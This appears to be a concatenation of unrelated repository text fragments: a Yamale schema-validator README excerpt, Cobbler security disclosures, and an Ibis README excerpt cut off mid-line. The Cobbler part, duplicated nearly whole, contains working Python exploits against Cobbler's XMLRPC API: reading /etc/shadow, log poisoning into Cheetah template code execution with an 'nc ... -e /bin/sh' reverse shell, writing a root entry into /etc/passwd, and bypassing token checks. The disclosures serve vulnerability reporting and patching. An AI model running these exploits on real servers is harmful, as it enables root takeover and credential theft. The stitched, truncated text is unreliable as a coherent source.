case-insensitive checking)\n    - `starts_with`: Accepts only strings starting with given value (add `ignore_case=True` for\n      case-insensitive checking)\n    - `matches`: Validates the string against a given regex. Similar to the `regex()` validator,\n      you can use `ignore_case`, `multiline` and `dotall`)\n    - `ends_with`: Accepts only strings ending with given value (add `ignore_case=True` for case-insensitive checking)\n    - `exclude`: Rejects strings that contains any character in the excluded value\n    - `ignore_case`: Validates strings in a case-insensitive manner.\n    - `multiline`: `^` and `$` in a pattern match at the beginning and end of each line in a string\n       in addition to matching at the beginning and end of the entire string. (A pattern matches\n       at [the beginning of a string](https://docs.python.org/3/library/re.html#re.match) even in\n       multiline mode; see below for a workaround.); only allowed in conjunction with a `matches` keyword.\n    - `dotall`: `.` in a pattern matches newline characters in a validated string in addition to\n      matching every character that *isn't* a newline.; only allowed in conjunction with a `matches` keyword.\n\nExamples:\n- `str(max=10, exclude='?!')`: Allows only strings less than 11 characters that don't contain `?` or `!`.\n\n### Regex - `regex([patterns], name=string, ignore_case=False, multiline=False, dotall=False)`\nValidates strings against one or more regular expressions.\n- arguments: one or more Python regular expression patterns\n- keywords:\n    - `name`: A friendly description for the patterns.\n    - `ignore_case`: Validates strings in a case-insensitive manner.\n    - `multiline`: `^` and `$` in a pattern match at the beginning and end of each line in a string\n       in addition to matching at the beginning and end of the entire string. (A pattern matches\n       at [the beginning of a string](https://docs.python.org/3/library/re.html#re.match) even in\n       multiline mode; see below for a workaround.)\n    - `dotall`: `.` in a pattern matches newline characters in a validated string in addition to\n      matching every character that *isn't* a newline.\n\nExamples:\n- `regex('^[^?!]{,10}$')`: Allows only strings less than 11 characters that don't contain `?` or `!`.\n- `regex(r'^(\\d+)(\\s\\1)+$', name='repeated natural')`: Allows only strings that contain two or\n  more identical digit sequences, each separated by a whitespace character. Non-matching strings\n  like `sugar` are rejected with a message like `'sugar' is not a repeated natural.`\n- `regex('.*^apples$', multiline=True, dotall=True)`: Allows the string `apples` as well\n  as multiline strings that contain the line `apples`.\n\n### Integer - `int(min=int, max=int)`\nValidates integers.\n- keywords\n    - `min`: int >= min\n    - `max`: int <= max\n\n### Number - `num(min=float, max=float)`\nValidates integers and floats.\n- keywords\n    - `min`: num >= min\n    - `max`: num <= max\n\n### Boolean - `bool()`\nValidates booleans.\n\n### Null - `null()`\nValidates null values.\n\n### Enum - `enum([primitives])`\nValidates from a list of constants.\n- arguments: constants to test equality with\n\nExamples:\n- `enum('a string', 1, False)`: a value can be either `'a string'`, `1` or `False`\n\n### Day - `day(min=date, max=date)`\nValidates a date in the form of YYYY-MM-DD.\n- keywords\n    - `min`: date >= min\n    - `max`: date <= max\n\nExamples:\n- `day(min='2001-01-01', max='2100-01-01')`: Only allows dates between 2001-01-01 and 2100-01-01.\n\n### Timestamp - `timestamp(min=time, max=time)`\nValidates a timestamp in the form of YYYY-MM-DD HH:MM:SS.\n- keywords\n    - `min`: time >= min\n    - `max`: time <= max\n\nExamples:\n- `timestamp(min='2001-01-01 01:00:00', max='2100-01-01 23:00:00')`: Only allows times between\n  2001-01-01 01:00:00 and 2100-01-01 23:00:00.\n\n### List - `list([validators], min=int, max=int)`\nValidates lists. If one or more validators are passed to `list()` only nodes that pass at\nleast one of those validators will be accepted.\n\n- arguments: one or more validators to test values with\n- keywords\n    - `min`: len(list) >= min\n    - `max`: len(list) <= max\n\nExamples:\n- `list()`: Validates any list\n- `list(include('custom'), int(), min=4)`: Only validates lists that contain the `custom` include\n  or integers and contains a minimum of 4 items.\n\n### Map - `map([validators], key=validator, min=int, max=int)`\nValidates maps. Use when you want a node to contain freeform data. Similar to `List`, `Map` takes\none or more validators to run against the values of its nodes, and only nodes that pass at least\none of those validators will be accepted. By default, only the values of nodes are validated and\nthe keys aren't checked.\n- arguments: one or more validators to test values with\n- keywords\n    - `key`: A validator for the keys of the map.\n    - `min`: len(map) >= min\n    - `max`: len(map) <= max\n\nExamples:\n- `map()`: Validates any map\n- `map(str(), int())`: Only validates maps whose values are strings or integers.\n- `map(str(), key=int())`: Only validates maps whose keys are integers and values are strings. `1: one` would be valid but `'1': one` would not.\n- `map(str(), min=1)`: Only validates a non-empty map.\n\n### IP Address - `ip()`\nValidates IPv4 and IPv6 addresses.\n\n- keywords\n    - `version`: 4 or 6; explicitly force IPv4 or IPv6 validation\n\nExamples:\n- `ip()`: Allows any valid IPv4 or IPv6 address\n- `ip(version=4)`: Allows any valid IPv4 address\n- `ip(version=6)`: Allows any valid IPv6 address\n\n### MAC Address - `mac()`\nValidates MAC addresses.\n\nExamples:\n- `mac()`: Allows any valid MAC address\n\n### SemVer (Semantic Versioning) - `semver()`\nValidates [Semantic Versioning](https://semver.org/) strings.\n\nExamples:\n- `semver()`: Allows any valid SemVer string\n\n### Any - `any([validators])`\nValidates against a union of types. Use when a node **must** contain **one and only one** of several types. It is valid\nif at least one of the listed validators is valid. If no validators are given, accept any value.\n- arguments: validators to test values with (if none is given, allow any value; if one or more are given,\none must be present)\n\nExamples:\n- `any(int(), null())`: Validates either an integer **or** a null value.\n- `any(num(), include('vector'))`: Validates **either** a number **or** an included 'vector' type.\n- `any(str(min=3, max=3),str(min=5, max=5),str(min=7, max=7))`: validates to a string that is exactly 3, 5, or 7 characters long\n- `any()`: Allows any value.\n\n### Subset - `subset([validators], allow_empty=False)`\nValidates against a subset of types. Unlike the `Any` validator, this validators allows **one or more** of several types.\nAs such, it *automatically validates against a list*. It is valid if all values can be validated against at least one\nvalidator.\n- arguments: validators to test with (at least one; if none is given, a `ValueError` exception will be raised)\n- keywords:\n    - `allow_empty`: Allow the subset to be empty (and is, therefore, also optional). This overrides the `required`\nflag.\n\nExamples:\n- `subset(int(), str())`: Validators against an integer, a string, or a list of either.\n- `subset(int(), str(), allow_empty=True)`: Same as above, but allows the empty set and makes the subset optional.\n\n### Include - `include(include_name)`\nValidates included structures. Must supply the name of a valid include.\n- arguments: single name of a defined include, surrounded by quotes.\n\nExamples:\n- `include('person')`\n\n### Custom validators\nIt is also possible to add your own custom validators. This is an advanced topic, but here is an\nexample of adding a `Date` validator and using it in a schema as `date()`\n\n```python\nimport yamale\nimport datetime\nfrom yamale.validators import DefaultValidators, Validator\n\nclass Date(Validator):\n    \"\"\" Custom Date validator \"\"\"\n    tag = 'date'\n\n    def _is_valid(self, value):\n        return isinstance(value, datetime.date)\n\nvalidators = DefaultValidators.copy()  # This is a dictionary\nvalidators[Date.tag] = Date\nschema = yamale.make_schema('./schema.yaml', validators=validators)\n# Then use `schema` as normal\n```\n\nExamples\n--------\n\n| :warning: Ensure that your schema definitions come from internal or trusted sources. Yamale does not protect against intentionally malicious schemas. |\n|:------------|\n\n### Using keywords\n#### Schema:\n```yaml\noptional: str(required=False)\noptional_min: int(min=1, required=False)\nmin: num(min=1.5)\nmax: int(max=100)\n```\n#### Valid Data:\n```yaml\noptional_min: 10\nmin: 1.6\nmax: 100\n```\n\n### Includes and recursion\n#### Schema:\n```yaml\ncustomerA: include('customer')\ncustomerB: include('customer')\nrecursion: include('recurse')\n---\ncustomer:\n    name: str()\n    age: int()\n    custom: include('custom_type')\n\ncustom_type:\n    integer: int()\n\nrecurse:\n    level: int()\n    again: include('recurse', required=False)\n```\n#### Valid Data:\n```yaml\ncustomerA:\n    name: bob\n    age: 900\n    custom:\n        integer: 1\ncustomerB:\n    name: jill\n    age: 1\n    custom:\n        integer: 3\nrecursion:\n    level: 1\n    again:\n        level: 2\n        again:\n            level: 3\n            again:\n                level: 4\n```\n\n### Lists\n#### Schema:\n```yaml\nlist_with_two_types: list(str(), include('variant'))\nquestions: list(include('question'))\n---\nvariant:\n  rsid: str()\n  name: str()\n\nquestion:\n  choices: list(include('choices'))\n  questions: list(include('question'), required=False)\n\nchoices:\n  id: str()\n```\n#### Valid Data:\n```yaml\nlist_with_two_types:\n  - 'some'\n  - rsid: 'rs123'\n    name: 'some SNP'\n  - 'thing'\n  - rsid: 'rs312'\n    name: 'another SNP'\nquestions:\n  - choices:\n      - id: 'id_str'\n      - id: 'id_str1'\n    questions:\n      - choices:\n        - id: 'id_str'\n        - id: 'id_str1'\n```\n\n### The data is a list of items without a keyword at the top level\n#### Schema:\n```yaml\nlist(include('human'), min=2, max=2)\n\n---\nhuman:\n  name: str()\n  age: int(max=200)\n  height: num()\n  awesome: bool()\n```\n#### Valid Data:\n```yaml\n- name: Bill\n  age: 26\n  height: 6.2\n  awesome: True\n\n- name: Adrian\n  age: 23\n  height: 6.3\n  awesome: True\n```\n\nWriting Tests\n-------------\nTo validate YAML files when you run your program's tests use Yamale's YamaleTestCase\n\nExample:\n\n```python\nclass TestYaml(YamaleTestCase):\n    base_dir = os.path.dirname(os.path.realpath(__file__))\n    schema = 'schema.yaml'\n    yaml = 'data.yaml'\n    # or yaml = ['data-*.yaml', 'some_data.yaml']\n\n    def runTest(self):\n        self.assertTrue(self.validate())\n```\n\n`base_dir`: String path to prepend to all other paths. This is optional.\n\n`schema`: String of path to the schema file to use. One schema file per test case.\n\n`yaml`: String or list of yaml files to validate. Accepts globs.\n\nDevelopers\n----------\n### Linting + Formatting\nYamale is formatted with [ruff](https://github.com/astral-sh/ruff). There is a github action enforcing\nruff formatting and linting rules. You can run this locally via `make lint` or by installing\nthe pre-commit hooks via `make install-hooks`\n\n### Testing\nYamale uses [Tox](https://tox.readthedocs.org/en/latest/) to run its tests against multiple Python\nversions. To run tests, first checkout Yamale, install Tox, then run `make test` in Yamale's root\ndirectory. You may also have to install the correct Python versions to test with as well.\n\nNOTE on Python versions: `tox.ini` specifies the lowest and highest versions of Python supported by\nYamale. Unless your development environment is configured to support testing against multiple Python\nversions, one or more of the test branches may fail. One method of enabling testing against multiple\nversions of Python is to install `pyenv` and `tox-pyenv` and to use `pyenv install` and `pyenv local`\nto ensure that tox is able to locate appropriate Pythons.\n\n### Releasing\nYamale uses Github Actions to upload new tags to PyPi.\nTo release a new version:\n\n1. Make a commit with the new version number in `yamale/VERSION`.\n1. Run tests for good luck.\n1. Run `make release`.\n\nGithub Actions will take care of the rest.\n",

This address is under control of @SchoolGuy currently.\n\nPlease be aware that since this project is not professionally managed we may have a hard time fixing this by ourselves.\nThe more details we get, the more likely it is that we can react to it properly.\n\nSince there is no funding for Cobbler, we can't offer you anything but our deepest thanks for finding a security issue.\n\n## Known problems\n\nAll open security problems which are publicly known are to be found at:\n\n> https://github.com/cobbler/cobbler/issues?q=is%3Aissue+is%3Aopen+label%3Asecurity\n\n## Remarks\n\nWe don't offer a SELinux profile or an Apparmor profile. Also this tool manages your\nDHCP and TFTP server. This implicates that Cobbler has a lot of control of your network, thus we would advise you to\nprotect it as much as possible. However please be aware of the implications when using it. There is code in there to\nautomatically download and update files on your local filesystem as well as serving files like bootloaders which have\nthe potential (if compromised) to do a lot of harm.\n",

Other vulnarabilites cannot be checked for if they have been used in the past on your system.\r\n \r\n## What can I do to protect myself?\r\n \r\nUpgrade to Cobbler V3.3.0 or V3.2.2 as soon as possible. For older Cobbler versions we won't backport this.\r\n \r\n## Details\r\n \r\n### Arbitrary file disclosure/Template Injection\r\n \r\nCobbler exposes an XMLRPC API interface that allows users to request some information without authentication.\r\n \r\nWe discovered that the `generate_script` RPC method could be used to get arbitrary files on the system.\r\n \r\n```python\r\n# cobbler/remote.py:2226\r\ndef generate_script(self, profile=None, system=None, name=None, **rest):\r\nreturn self.api.generate_script(profile, system, name)\r\n \r\n# cobbler/api.py:1306\r\ndef generate_script(self, profile, system, name):\r\nif system:\r\nreturn self.tftpgen.generate_script(\"system\", system, name)\r\nelse:\r\nreturn self.tftpgen.generate_script(\"profile\", profile, name)\r\n \r\n# cobbler/tftpgen.py:1189\r\ndef generate_script(self, what: str, objname: str, script_name) -> str:\r\n# [...]\r\ntemplate = os.path.normpath(os.path.join(\"/var/lib/cobbler/scripts\", script_name))\r\nif not os.path.exists(template):\r\nreturn \"# script template %s not found\" % script_name\r\n \r\ntemplate_fh = open(template)\r\ntemplate_data = template_fh.read()\r\ntemplate_fh.close()\r\nreturn self.templar.render(template_data, blended, None)\r\n```\r\n \r\nWe can see that the `name` parameter is not sanitized before being passed to `os.path.join` and then `open`.\r\n \r\nThat way, we can abuse this RPC method to read arbitrary files as root.\r\n \r\n```python\r\nimport xmlrpc.client\r\nimport traceback\r\n \r\ndef try_connect(url):\r\ntry:\r\nxmlrpc_server = xmlrpc.client.ServerProxy(url)\r\nreturn xmlrpc_server\r\nexcept:\r\ntraceback.print_exc()\r\nreturn None\r\n \r\nif __name__ == '__main__':\r\napi = try_connect(\"http://[cobbler_server]/cobbler_api\")\r\n \r\nprofiles = api.get_profiles()\r\nif len(profiles) > 0:\r\ntarget = profiles[0][\"name\"]\r\nprint(api.generate_script(target, \"\", \"/etc/shadow\"))\r\nelse:\r\nprint(\"No profiles\")\r\n```\r\n \r\nBecause the file is rendered using a template engine (by default, [Cheetah](https://pythonhosted.org/Cheetah/)), we could perform a template injection in order to gain arbitrary code execution.\r\n \r\nCheetah allows templates to execute arbitrary Python code, so no needs for a Sandbox escape or tricky object manipulation.\r\n \r\nHowever, we still need to write an arbitrary template code to the filesystem.\r\n \r\nWe found that the easiest way to do that is to perform a log poisoning attack.\r\n \r\nIn the `cobbler/remote.py` file, many endpoints are calling the `_log` method that writes some RPC parameters in the cobbler log file.\r\nUsing the endpoint of our choice, we can manipulate the cobbler log file, and then, evaluate this file as a template using this vulnerability.\r\n \r\n```python\r\nimport xmlrpc.client\r\nimport traceback\r\n \r\ndef try_connect(url):\r\ntry:\r\nxmlrpc_server = xmlrpc.client.ServerProxy(url)\r\nreturn xmlrpc_server\r\nexcept:\r\ntraceback.print_exc()\r\nreturn None\r\n \r\nif __name__ == '__main__':\r\nexploitcode = '__import__(\\'os\\').system(\\'nc [tnpitsecurity] 4242 -e /bin/sh\\')'\r\napi = try_connect(\"http://[cobbler_server]/cobbler_api\")\r\n \r\nprofiles = api.get_profiles()\r\nif len(profiles) > 0:\r\nprint(\"Found a valid profile, exploiting...\")\r\ntarget = profiles[0][\"name\"]\r\nprint(\"[+] Stage 1 : Poisoning log with Cheetah template RCE\")\r\nprint(api.generate_script(target, \"\", '{<%= ' + exploitcode + ' %>}'))\r\nprint(\"[+] Stage 2 : Rendering template using an arbitrary file read.\")\r\nprint(api.generate_script(target, \"\", \"/proc/self/fd/5\"))\r\n```\r\n \r\n> /proc/self/fd/5 is the file descriptor that points to the cobbler log file.\r\n \r\nBecause Cobblerd is running as *root*, we have a complete access to the deployment server.\r\n \r\n### Arbitrary file write\r\n \r\nCobblerd supports [anamon](https://github.com/cobbler/cobbler/blob/master/misc/anamon): a script that automatically logs details from an Anaconda\r\ninstall back to a cobbler server .\r\n \r\nIf the `anamon_enabled` setting is enabled, we can call the `upload_log_data` XMLRPC function that is used to send `anamon` log files.\r\n \r\n```python\r\n# cobbler/remote.py:2577\r\ndef upload_log_data(self, sys_name, file, size, offset, data, token=None, **rest):\r\nif not self.api.settings().anamon_enabled:\r\n# feature disabled!\r\nreturn False\r\n# Find matching system record\r\nsystems = self.api.systems()\r\nobj = systems.find(name=sys_name)\r\nif obj is None:\r\n# system not found!\r\nself._log(\"upload_log_data -

However the `sys_name` user-supplied parameter is not checked.\r\n \r\nEven if `sys_name` is invalid, the log file is still saved.\r\n \r\n```python\r\nimport xmlrpc.client\r\nimport traceback\r\nimport base64\r\n \r\ndef try_connect(url):\r\ntry:\r\nxmlrpc_server = xmlrpc.client.ServerProxy(url)\r\nreturn xmlrpc_server\r\nexcept:\r\ntraceback.print_exc()\r\nreturn None\r\n \r\nif __name__ == '__main__':\r\napi = try_connect(\"http://[cobbler_server]/cobbler_api\")\r\nexploit = b\"cha:!:0:0:cha:/:/bin/bash\\n\"\r\nprint(api.upload_log_data(\"../../../../../../etc\", \"passwd\", len(exploit), 100000, base64.b64encode(exploit)))\r\n```\r\n \r\nUsing this exploit, we can manipulate any file on the system as root.\r\n \r\n> Note that due to a change in the Python XMLRPC API, that PoC may not work against servers using a recent Python version (Binary type used instead of bytes).\r\n \r\n## Credits\r\n \r\nNicolas Chatelain <nicolas.chatelain -at- tnpconsultants.com>\r\n \r\n## Advisory of the reporter\r\n \r\nhttps://tnpitsecurity.com/blog/cobbler-multiple-vulnerabilities/",

                "body": "Looking at Cobbler's XMLRPC API, there are many places where the user supplied security token is not being correctly validated, effectively resulting in authentication being bypassed.\r\n\r\nUsing some quick-and-dirty [AST parse magic](https://docs.python.org/2/library/ast.html), I discovered that there are no fewer than 70 other endpoints that require an security token but don't actually use it!\r\n\r\nThis means that unauthenticated users are able to perform all sorts of actions that they should not be able to. \r\n\r\n# Example\r\n\r\nFor example, the `upload_log_data` endpoint allows users to upload files to the server. As this is a dangerous action, there is a flag in `/etc/cobbler/settings` that must be explicitly enabled before this functionality becomes available:\r\n\r\nFrom [`/etc/cobbler/settings`](https://github.com/cobbler/cobbler/blob/650e4226e31613c9a6fda024da9b1df24d27fc95/config/cobbler/settings#L32):\r\n```yaml\r\n# NOTE: This does allow an xmlrpc call to send logs\r\n# to this directory, without authentication, so enable only if you are\r\n# ok with this limitation.\r\nanamon_enabled: 0\r\n```\r\n\r\nHowever, authenticated users can also change this setting in a running server using the `modify_setting` endpoint in the XMLRPC API.\r\n\r\n`modify_setting(self, setting_name, value, token)`\r\n\r\nBut the actual implementation of the endpoint never validates the value of the `token` parameter, so any value works:\r\n\r\n```python\r\n# Python 2.7\r\n\r\nimport base64\r\nfrom xmlrpclib import ServerProxy\r\n\r\ncobbler_connection = ServerProxy(\"http://192.168.0.244/cobbler_api\", allow_none=True)\r\n\r\nname = \"greeting.txt\"\r\npayload = b\"Hello!\"\r\ndata = base64.encodestring(payload)\r\n\r\n# Try to upload logs with anamon_enabled = 0. Fails and returns False.\r\nassert cobbler_connection.upload_log_data('sysname', name, len(payload), 0, data) == False\r\n\r\n# Change the anamon_enabled setting, using a fake security token.\r\ncobbler_connection.modify_setting('anamon_enabled', '1', 'bogus_token')\r\n\r\n# Try again. This time it works.\r\nassert cobbler_connection.upload_log_data('sysname', name, len(payload), 0, data) == True\r\n```\r\n\r\nSo it doesn't matter whether the server operator is \"ok with this limitation\", since unauthenticated users can change the value at any time.\r\n\r\n# Conclusion\r\n\r\nThere are many other potentially harmful endpoints in the API, and many more creative ways to exploit them.\r\n\r\nThe Cobbler XMLRPC API needs to be carefully examined with security in mind to make sure that all of the API endpoints are validating their security tokens correctly.\r\n\r\nIn the meantime, consider using a firewall to restrict/disable access to the `/cobbler_api` endpoint.\r\n\r\nSee [this post](https://movermeyer.com/2018-08-02-privilege-escalation-exploits-in-cobblers-api/) for more discussion.",

Prior to CVE-2018-10931 patch (commit [b47081b](https://github.com/cobbler/cobbler/commit/b47081b1f36e57a2a737a3cf841b1f38b31c15ef)) it was trivial to completely bypass auth via using the __make_token call. It was possible to use `_CobblerXMLRPCInterface__make_token` as a methodName in an xmlrpc call. __make_token just returns you a token for the user you specify, giving complete access to the API.\r\n> For old targets vulnerable to RCE via repo download this is a wonderful oportunity for unauth rce.\r\n\r\nThanks a lot! This heads up is very much appreciated!\r\nBeside that I realized that remote (especially unauthenticated web interface) should get a security review, this is an (german saying directly translated, I guess it fits) amazing barn door that should get addressed. Will do...",

Those could also be used. In general, user input sanitization could be a thing. Also you could use shell=False, which is not the case for the specific call. If shell would be False, then at least you narrow it down from a command execution to an argument execution. Still, rsync does offer -e, which could be used to run commands.",

There was an attempt to mitigate it in cobbler but the && (and ||\nI'm sure) aren't in the list of things it removes from the\nusername/password fields.\n\nThe solution I proposed on the dev list a while back was to send that\ndata to the command via STDIN instead of on the command line (more\nsecure anyway if someone's watching process lists). I have a branch\nlocally that started fleshing this out, but the main issue will be to\nget people to switch their templates out.\n\nThe other possible solution is for people to change all of their power\ntemplates, which use double quotes around variables.

Other vulnarabilites cannot be checked for if they have been used in the past on your system.\r\n \r\n## What can I do to protect myself?\r\n \r\nUpgrade to Cobbler V3.3.0 or V3.2.2 as soon as possible. For older Cobbler versions we won't backport this.\r\n \r\n## Details\r\n \r\n### Arbitrary file disclosure/Template Injection\r\n \r\nCobbler exposes an XMLRPC API interface that allows users to request some information without authentication.\r\n \r\nWe discovered that the `generate_script` RPC method could be used to get arbitrary files on the system.\r\n \r\n```python\r\n# cobbler/remote.py:2226\r\ndef generate_script(self, profile=None, system=None, name=None, **rest):\r\nreturn self.api.generate_script(profile, system, name)\r\n \r\n# cobbler/api.py:1306\r\ndef generate_script(self, profile, system, name):\r\nif system:\r\nreturn self.tftpgen.generate_script(\"system\", system, name)\r\nelse:\r\nreturn self.tftpgen.generate_script(\"profile\", profile, name)\r\n \r\n# cobbler/tftpgen.py:1189\r\ndef generate_script(self, what: str, objname: str, script_name) -> str:\r\n# [...]\r\ntemplate = os.path.normpath(os.path.join(\"/var/lib/cobbler/scripts\", script_name))\r\nif not os.path.exists(template):\r\nreturn \"# script template %s not found\" % script_name\r\n \r\ntemplate_fh = open(template)\r\ntemplate_data = template_fh.read()\r\ntemplate_fh.close()\r\nreturn self.templar.render(template_data, blended, None)\r\n```\r\n \r\nWe can see that the `name` parameter is not sanitized before being passed to `os.path.join` and then `open`.\r\n \r\nThat way, we can abuse this RPC method to read arbitrary files as root.\r\n \r\n```python\r\nimport xmlrpc.client\r\nimport traceback\r\n \r\ndef try_connect(url):\r\ntry:\r\nxmlrpc_server = xmlrpc.client.ServerProxy(url)\r\nreturn xmlrpc_server\r\nexcept:\r\ntraceback.print_exc()\r\nreturn None\r\n \r\nif __name__ == '__main__':\r\napi = try_connect(\"http://[cobbler_server]/cobbler_api\")\r\n \r\nprofiles = api.get_profiles()\r\nif len(profiles) > 0:\r\ntarget = profiles[0][\"name\"]\r\nprint(api.generate_script(target, \"\", \"/etc/shadow\"))\r\nelse:\r\nprint(\"No profiles\")\r\n```\r\n \r\nBecause the file is rendered using a template engine (by default, [Cheetah](https://pythonhosted.org/Cheetah/)), we could perform a template injection in order to gain arbitrary code execution.\r\n \r\nCheetah allows templates to execute arbitrary Python code, so no needs for a Sandbox escape or tricky object manipulation.\r\n \r\nHowever, we still need to write an arbitrary template code to the filesystem.\r\n \r\nWe found that the easiest way to do that is to perform a log poisoning attack.\r\n \r\nIn the `cobbler/remote.py` file, many endpoints are calling the `_log` method that writes some RPC parameters in the cobbler log file.\r\nUsing the endpoint of our choice, we can manipulate the cobbler log file, and then, evaluate this file as a template using this vulnerability.\r\n \r\n```python\r\nimport xmlrpc.client\r\nimport traceback\r\n \r\ndef try_connect(url):\r\ntry:\r\nxmlrpc_server = xmlrpc.client.ServerProxy(url)\r\nreturn xmlrpc_server\r\nexcept:\r\ntraceback.print_exc()\r\nreturn None\r\n \r\nif __name__ == '__main__':\r\nexploitcode = '__import__(\\'os\\').system(\\'nc [tnpitsecurity] 4242 -e /bin/sh\\')'\r\napi = try_connect(\"http://[cobbler_server]/cobbler_api\")\r\n \r\nprofiles = api.get_profiles()\r\nif len(profiles) > 0:\r\nprint(\"Found a valid profile, exploiting...\")\r\ntarget = profiles[0][\"name\"]\r\nprint(\"[+] Stage 1 : Poisoning log with Cheetah template RCE\")\r\nprint(api.generate_script(target, \"\", '{<%= ' + exploitcode + ' %>}'))\r\nprint(\"[+] Stage 2 : Rendering template using an arbitrary file read.\")\r\nprint(api.generate_script(target, \"\", \"/proc/self/fd/5\"))\r\n```\r\n \r\n> /proc/self/fd/5 is the file descriptor that points to the cobbler log file.\r\n \r\nBecause Cobblerd is running as *root*, we have a complete access to the deployment server.\r\n \r\n### Arbitrary file write\r\n \r\nCobblerd supports [anamon](https://github.com/cobbler/cobbler/blob/master/misc/anamon): a script that automatically logs details from an Anaconda\r\ninstall back to a cobbler server .\r\n \r\nIf the `anamon_enabled` setting is enabled, we can call the `upload_log_data` XMLRPC function that is used to send `anamon` log files.\r\n \r\n```python\r\n# cobbler/remote.py:2577\r\ndef upload_log_data(self, sys_name, file, size, offset, data, token=None, **rest):\r\nif not self.api.settings().anamon_enabled:\r\n# feature disabled!\r\nreturn False\r\n# Find matching system record\r\nsystems = self.api.systems()\r\nobj = systems.find(name=sys_name)\r\nif obj is None:\r\n# system not found!\r\nself._log(\"upload_log_data - WARNING - system '%s' not found in Cobbler\" % sys_name, token=token,\r\nname=sys_name)\r\n \r\nreturn self.__upload_file(sys_name, file, size, offset, data)\r\n \r\ndef __upload_file(self, sys_name, file, size, offset, data):\r\ncontents = base64.decodestring(data)\r\ndel data\r\nif offset != -1:\r\nif size is not None:\r\nif size != len(contents):\r\nreturn False\r\n \r\n# XXX -

However the `sys_name` user-supplied parameter is not checked.\r\n \r\nEven if `sys_name` is invalid, the log file is still saved.\r\n \r\n```python\r\nimport xmlrpc.client\r\nimport traceback\r\nimport base64\r\n \r\ndef try_connect(url):\r\ntry:\r\nxmlrpc_server = xmlrpc.client.ServerProxy(url)\r\nreturn xmlrpc_server\r\nexcept:\r\ntraceback.print_exc()\r\nreturn None\r\n \r\nif __name__ == '__main__':\r\napi = try_connect(\"http://[cobbler_server]/cobbler_api\")\r\nexploit = b\"cha:!:0:0:cha:/:/bin/bash\\n\"\r\nprint(api.upload_log_data(\"../../../../../../etc\", \"passwd\", len(exploit), 100000, base64.b64encode(exploit)))\r\n```\r\n \r\nUsing this exploit, we can manipulate any file on the system as root.\r\n \r\n> Note that due to a change in the Python XMLRPC API, that PoC may not work against servers using a recent Python version (Binary type used instead of bytes).\r\n \r\n## Credits\r\n \r\nNicolas Chatelain <nicolas.chatelain -at- tnpconsultants.com>\r\n \r\n## Advisory of the reporter\r\n \r\nhttps://tnpitsecurity.com/blog/cobbler-multiple-vulnerabilities/",

branch](https://img.shields.io/codecov/c/github/ibis-project/ibis/main.svg)](https://codecov.io/gh/ibis-project/ibis)\n\n## What is Ibis?\n\nIbis is the portable Python dataframe library:\n\n- Fast local dataframes (via DuckDB by default)\n- Lazy dataframe expressions\n- Interactive mode for iterative data exploration\n- [Compose Python dataframe and SQL code](#python--sql-better-together)\n- Use the same dataframe API for [20+ backends](#backends)\n- Iterate locally and deploy remotely by [changing a single line of code](#portability)\n\nSee the documentation on [\"Why Ibis?\"](https://ibis-project.org/why) to learn more.\n\n## Getting started\n\nYou can `pip install` Ibis with a backend and example data:\n\n```bash\npip install 'ibis-framework[duckdb,examples]'\n```\n\n> 💡 **Tip**\n>\n> See the [installation guide](https://ibis-project.org/install) for more installation options.\n\nThen use Ibis:\n\n```python\n>>> import ibis\n>>> ibis.options.interactive = True\n>>> t = ibis.examples.penguins.fetch()\n>>> t\n┏━━━━━━━━━┳━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━┳━━━━━━━━┳━━━━━━━┓\n┃

Python + SQL: better together\n\nFor most backends, Ibis works by compiling its dataframe expressions into SQL:\n\n```python\n>>> ibis.to_sql(g)\nSELECT\n  \"t1\".\"species\",\n  \"t1\".\"island\",\n  \"t1\".\"count\"\nFROM (\n  SELECT\n    \"t0\".\"species\",\n    \"t0\".\"island\",\n    COUNT(*) AS \"count\"\n  FROM \"penguins\" AS \"t0\"\n  GROUP BY\n    1,\n    2\n) AS \"t1\"\nORDER BY\n  \"t1\".\"count\" ASC\n```\n\nYou can mix SQL and Python code:\n\n```python\n>>> a = t.sql(\"SELECT species, island, count(*) AS count FROM penguins GROUP BY 1, 2\")\n>>> a\n┏━━━━━━━━━━━┳━━━━━━━━━━━┳━━━━━━━┓\n┃ species   ┃ island    ┃ count ┃\n┡━━━━━━━━━━━╇━━━━━━━━━━━╇━━━━━━━┩\n│ string    │ string    │ int64 │\n├───────────┼───────────┼───────┤\n│ Adelie    │

 │   124 │\n└───────────┴───────────┴───────┘\n```\n\nThis allows you to combine the flexibility of Python with the scale and performance of modern SQL.\n\n## Backends\n\nIbis supports nearly 20 backends:\n\n- [Apache DataFusion](https://ibis-project.org/backends/datafusion/)\n- [Apache Druid](https://ibis-project.org/backends/druid/)\n- [Apache Flink](https://ibis-project.org/backends/flink)\n- [Apache Impala](https://ibis-project.org/backends/impala/)\n- [Apache PySpark](https://ibis-project.org/backends/pyspark/)\n- [BigQuery](https://ibis-project.org/backends/bigquery/)\n- [ClickHouse](https://ibis-project.org/backends/clickhouse/)\n- [DuckDB](https://ibis-project.org/backends/duckdb/)\n- [Exasol](https://ibis-project.org/backends/exasol)\n- [MySQL](https://ibis-project.org/backends/mysql/)\n- [Oracle](https://ibis-project.org/backends/oracle/)\n- [Polars](https://ibis-project.org/backends/polars/)\n- [PostgreSQL](https://ibis-project.org/backends/postgresql/)\n- [RisingWave](https://ibis-project.org/backends/risingwave/)\n- [SQL Server](https://ibis-project.org/backends/mssql/)\n- [SQLite](https://ibis-project.org/backends/sqlite/)\n- [Snowflake](https://ibis-project.org/backends/snowflake)\n- [Trino](https://ibis-project.org/backends/trino/)\n\n## How it works\n\nMost Python dataframes are tightly coupled to their execution engine. And many databases only support SQL, with no Python API. Ibis solves this problem by providing a common API for data manipulation in Python, and compiling that API into the backend’s native language. This means you can learn a single API and use it across any supported backend (execution engine).\n\nIbis broadly supports two types of backend:\n\n1. SQL-generating backends\n2. DataFrame-generating backends\n\n![Ibis backend types](./docs/images/backends.png)\n\n## Portability\n\nTo use different backends, you can set the backend Ibis uses:\n\n```python\n>>> ibis.set_backend(\"duckdb\")\n>>> ibis.set_backend(\"polars\")\n>>> ibis.set_backend(\"datafusion\")\n```\n\nTypically, you'll create a connection object:\n\n```python\n>>> con = ibis.duckdb.connect()\n>>> con = ibis.polars.connect()\n>>> con = ibis.datafusion.connect()\n```\n\nAnd work with tables in that backend:\n\n```python\n>>> con.list_tables()\n['penguins']\n>>> t = con.table(\"penguins\")\n```\n\nYou can also read from common file formats like CSV or Apache Parquet:\n\n```python\n>>> t = 